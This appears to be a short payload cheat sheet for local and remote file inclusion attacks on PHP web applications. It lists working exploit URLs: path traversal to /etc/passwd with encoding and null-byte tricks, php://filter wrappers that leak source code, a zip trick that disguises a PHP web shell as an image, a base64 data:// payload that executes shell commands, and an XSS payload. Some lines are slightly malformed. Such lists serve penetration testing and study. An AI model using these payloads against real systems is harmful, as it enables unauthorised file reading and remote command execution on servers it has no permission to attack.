# Local/Remote File Inclusion
The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.

## Exploit

Basic LFI (null byte, double encoding and other tricks)
```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

LFI Wrapper rot13 and base64 - php://filter case insensitive
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php=pHp://FilTer/convert.base64-encode/resource=index.php
```

LFI Wrapper zip
```python
os.system("echo \"</pre><?php system($_GET['cmd']); ?></pre>\" > payload.php; zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php")
				
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```


RFI Wrapper with "<?php system($_GET['cmd']);echo 'Shell done !'; ?>" payload
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```


XSS via RFI/LFI with "<<svg<>svg onload=alert(1)>" payload
<svg onload=alert(1)>
```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

## Thanks to
* https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion